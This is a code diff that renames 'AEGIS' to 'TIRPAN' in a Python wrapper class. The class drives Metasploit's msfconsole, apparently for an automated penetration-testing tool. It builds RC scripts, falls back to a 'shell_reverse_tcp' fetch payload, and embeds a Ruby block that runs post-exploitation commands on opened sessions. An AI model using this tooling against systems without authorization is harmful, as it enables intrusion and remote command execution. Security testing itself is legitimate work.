@@ -411,7 +411,7 @@ class MetasploitTool(BaseTool):
         rc_content = "\n".join(rc_commands) + "\nexit -y\n"
         logger.info("msfconsole RC script:\n%s", rc_content)
 
-        fd, rc_path = tempfile.mkstemp(suffix=".rc", prefix="aegis_msf_")
+        fd, rc_path = tempfile.mkstemp(suffix=".rc", prefix="tirpan_msf_")
         try:
             with os.fdopen(fd, "w") as f:
                 f.write(rc_content)
@@ -428,14 +428,14 @@ class MetasploitTool(BaseTool):
                 stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=timeout)
                 output = stdout.decode("utf-8", errors="replace")
                 # DEBUG: log full output so we can see exactly what msfconsole produced
-                logger.debug("[AEGIS-DEBUG] msfconsole FULL output (%d chars):\n%s", len(output), output)
+                logger.debug("[TIRPAN-DEBUG] msfconsole FULL output (%d chars):\n%s", len(output), output)
                 logger.info("msfconsole output (%d chars):\n%s", len(output), output[:4000])
                 return output
             except asyncio.TimeoutError:
                 proc.kill()
                 await proc.communicate()
                 logger.error("msfconsole timed out after %ds — killed", timeout)
-                return "[AEGIS] msfconsole timed out after %ds. The exploit may need more time or msfconsole is stuck." % timeout
+                return "[TIRPAN] msfconsole timed out after %ds. The exploit may need more time or msfconsole is stuck." % timeout
         finally:
             try:
                 os.unlink(rc_path)
@@ -557,7 +557,7 @@ class MetasploitTool(BaseTool):
     #
     # Bind payloads (bind_netcat, bind_perl, …) are preferred:
     #   • No LHOST required
-    #   • No HTTP fetch server (avoids port-8080 clash with AEGIS)
+    #   • No HTTP fetch server (avoids port-8080 clash with TIRPAN)
     #   • Work behind NAT/WSL
     #
     # Fetch payloads (cmd/linux/http/…) are a fallback only — they start an
@@ -577,7 +577,7 @@ class MetasploitTool(BaseTool):
         "cmd/unix/interact",             # Legacy MSF (kept for older installations)
     ]
 
-    # Port for HTTP fetch payloads — must NOT conflict with AEGIS (8080).
+    # Port for HTTP fetch payloads — must NOT conflict with TIRPAN (8080).
     _FETCH_SRVPORT: int = 9090
 
     # Default bind-shell payloads by module platform.
@@ -638,7 +638,7 @@ class MetasploitTool(BaseTool):
         post_timeout_extra = len(post_commands) * 20 if post_commands else 0
         exploit_timeout = MSF_CONSOLE_TIMEOUT + post_timeout_extra
         logger.info(
-            "[AEGIS-DEBUG] timeout=%ds (base=%ds + post_extra=%ds for %d post_commands)",
+            "[TIRPAN-DEBUG] timeout=%ds (base=%ds + post_extra=%ds for %d post_commands)",
             exploit_timeout, MSF_CONSOLE_TIMEOUT, post_timeout_extra, len(post_commands),
         )
 
@@ -679,37 +679,37 @@ class MetasploitTool(BaseTool):
         else:
             error_msg = "No session opened"
 
-        # Extract post-command output from [AEGIS_CMD_OUT:N] tagged lines.
+        # Extract post-command output from [TIRPAN_CMD_OUT:N] tagged lines.
         # ERB block prints these using framework.sessions API — never local exec.
         post_output: str | None = None
         # Strip ANSI escape codes for clean parsing
         _ansi_re = re.compile(r"\x1b\[[0-9;]*[mGKHF]")
         clean_output = _ansi_re.sub("", output)
-        logger.debug("[AEGIS-DEBUG] clean_output (ANSI stripped, %d chars):\n%s",
+        logger.debug("[TIRPAN-DEBUG] clean_output (ANSI stripped, %d chars):\n%s",
                      len(clean_output), clean_output[:6000])
 
         if post_commands:
-            # Parse all [AEGIS_CMD_OUT:N] lines regardless of success
+            # Parse all [TIRPAN_CMD_OUT:N] lines regardless of success
             # (so we can detect the "no session" case vs actual output)
             out_lines: list[str] = []
             for line in clean_output.splitlines():
-                m2 = re.search(r'\[AEGIS_CMD_OUT:\d+\] (.+)', line)
+                m2 = re.search(r'\[TIRPAN_CMD_OUT:\d+\] (.+)', line)
                 if m2:
                     out_lines.append(m2.group(1))
-            logger.info("[AEGIS-DEBUG] post_command_output parsed %d lines from [AEGIS_CMD_OUT] tags",
+            logger.info("[TIRPAN-DEBUG] post_command_output parsed %d lines from [TIRPAN_CMD_OUT] tags",
                         len(out_lines))
 
-            # Also log AEGIS debug/info lines for visibility
+            # Also log TIRPAN debug/info lines for visibility
             for line in clean_output.splitlines():
-                if "[AEGIS" in line:
-                    logger.info("[AEGIS-DEBUG] ERB output line: %s", line.strip())
+                if "[TIRPAN" in line:
+                    logger.info("[TIRPAN-DEBUG] ERB output line: %s", line.strip())
 
             if out_lines:
                 post_output = "\n".join(out_lines)
-                logger.info("[AEGIS-DEBUG] post_output (%d chars):\n%s",
+                logger.info("[TIRPAN-DEBUG] post_output (%d chars):\n%s",
                             len(post_output), post_output[:3000])
             else:
-                logger.warning("[AEGIS-DEBUG] post_commands were set but NO [AEGIS_CMD_OUT] lines found. "
+                logger.warning("[TIRPAN-DEBUG] post_commands were set but NO [TIRPAN_CMD_OUT] lines found. "
                                "Possible causes: (1) exploit failed, (2) ERB block not executed, "
                                "(3) shell_command_token failed, (4) msfconsole version too old for ERB.")
 
@@ -783,7 +783,7 @@ class MetasploitTool(BaseTool):
         We deliberately skip the "no explicit payload" attempt: omitting PAYLOAD
         in modern MSF causes the globally configured fetch payload
         (cmd/linux/http/x86/meterpreter_reverse_tcp) to be used, which tries to
-        start an HTTP listener on port 8080 — the same port AEGIS listens on.
+        start an HTTP listener on port 8080 — the same port TIRPAN listens on.
         """
         last_output = ""
 
@@ -871,7 +871,7 @@ class MetasploitTool(BaseTool):
 
         # ── Pass 2: fetch payload fallback on non-conflicting port ────────────
         # Use cmd/linux/http/x86/shell_reverse_tcp with FETCH_SRVPORT=9090
-        # (avoids the default 8080 which conflicts with AEGIS web server).
+        # (avoids the default 8080 which conflicts with TIRPAN web server).
         fetch_payload = "cmd/linux/http/x86/shell_reverse_tcp"
         fetch_opts = dict(extra_opts)
         fetch_opts["FETCH_SRVPORT"] = str(self._FETCH_SRVPORT)
@@ -928,40 +928,40 @@ class MetasploitTool(BaseTool):
           execution. Commands NEVER run locally.
 
         Output format: each command output line is prefixed with
-        [AEGIS_CMD_OUT:N] for reliable parsing from msfconsole stdout.
+        [TIRPAN_CMD_OUT:N] for reliable parsing from msfconsole stdout.
         """
         ruby_cmds = "[" + ", ".join(f'"{self._ruby_escape(cmd)}"' for cmd in post_commands) + "]"
-        logger.debug("[AEGIS-DEBUG] ERB ruby_cmds literal: %s", ruby_cmds)
+        logger.debug("[TIRPAN-DEBUG] ERB ruby_cmds literal: %s", ruby_cmds)
         lines = [
             "<ruby>",
-            "# AEGIS post-exploitation block — runs after run -z",
+            "# TIRPAN post-exploitation block — runs after run -z",
             "# Uses framework.sessions API: safe when exploit fails (no local exec)",
             "sleep(2)  # let session fully register in framework.sessions",
             "sid = framework.sessions.keys.map { |k| k.to_i }.max",
-            f"_aegis_cmds = {ruby_cmds}",
-            'print_good("[AEGIS-DEBUG] framework.sessions count=#{framework.sessions.length} last_sid=#{sid.inspect}")',
+            f"_tirpan_cmds = {ruby_cmds}",
+            'print_good("[TIRPAN-DEBUG] framework.sessions count=#{framework.sessions.length} last_sid=#{sid.inspect}")',
             'if sid && (s = framework.sessions[sid])',
             '  stype = s.respond_to?(:type) ? s.type : "unknown"',
-            '  print_good("[AEGIS] post_cmd session=#{sid} type=#{stype}")',
-            '  _aegis_cmds.each_with_index do |cmd, idx|',
-            '    print_good("[AEGIS_CMD_START:#{idx}] #{cmd}")',
+            '  print_good("[TIRPAN] post_cmd session=#{sid} type=#{stype}")',
+            '  _tirpan_cmds.each_with_index do |cmd, idx|',
+            '    print_good("[TIRPAN_CMD_START:#{idx}] #{cmd}")',
             '    begin',
             '      out = s.shell_command_token(cmd, 15)',
             '      out_str = (out || "").strip',
-            '      print_good("[AEGIS-DEBUG] cmd #{idx} raw output length=#{out_str.length}")',
-            '      out_str.each_line { |line| print_good("[AEGIS_CMD_OUT:#{idx}] #{line.chomp}") }',
+            '      print_good("[TIRPAN-DEBUG] cmd #{idx} raw output length=#{out_str.length}")',
+            '      out_str.each_line { |line| print_good("[TIRPAN_CMD_OUT:#{idx}] #{line.chomp}") }',
             '    rescue => e',
-            '      print_error("[AEGIS_CMD_ERR:#{idx}] #{e.class}: #{e.message}")',
+            '      print_error("[TIRPAN_CMD_ERR:#{idx}] #{e.class}: #{e.message}")',
             '    end',
-            '    print_good("[AEGIS_CMD_END:#{idx}]")',
+            '    print_good("[TIRPAN_CMD_END:#{idx}]")',
             '  end',
             'else',
-            '  print_error("[AEGIS] No session opened — post_commands skipped (exploit failed or session not in framework)")',
+            '  print_error("[TIRPAN] No session opened — post_commands skipped (exploit failed or session not in framework)")',
             'end',
             '</ruby>',
         ]
         erb_block = "\n".join(lines)
-        logger.debug("[AEGIS-DEBUG] ERB block to embed in RC:\n%s", erb_block)
+        logger.debug("[TIRPAN-DEBUG] ERB block to embed in RC:\n%s", erb_block)
         return erb_block
 
     def _build_rc_commands(
@@ -1023,7 +1023,7 @@ class MetasploitTool(BaseTool):
         commands.append("run -z")
 
         if post_commands:
-            logger.info("[AEGIS-DEBUG] Adding ERB post_commands block (%d commands): %s",
+            logger.info("[TIRPAN-DEBUG] Adding ERB post_commands block (%d commands): %s",
                         len(post_commands), post_commands)
             commands.append(self._build_post_commands_erb(post_commands))
 
